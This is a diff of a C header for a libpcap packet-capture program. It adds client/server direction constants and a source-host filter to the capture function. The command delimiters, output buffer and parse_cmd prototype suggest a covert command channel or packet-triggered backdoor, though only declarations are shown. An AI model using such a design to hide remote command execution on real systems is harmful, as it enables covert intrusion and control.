@@ -13,6 +13,8 @@
 #define CMD_START 		"cmd["
 #define CMD_END 		"]cmd"
 #define CMD_OUTPUT_SIZE         30000
+#define FROM_SERVER		1
+#define FROM_CLIENT		0
 
 /* IP header */
 struct ip_struct {
@@ -59,7 +61,7 @@ struct tcp_struct {
         u_short th_urp;                 /* urgent pointer */
 };
 
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int port);
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port);
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
 char * parse_cmd(char * command);
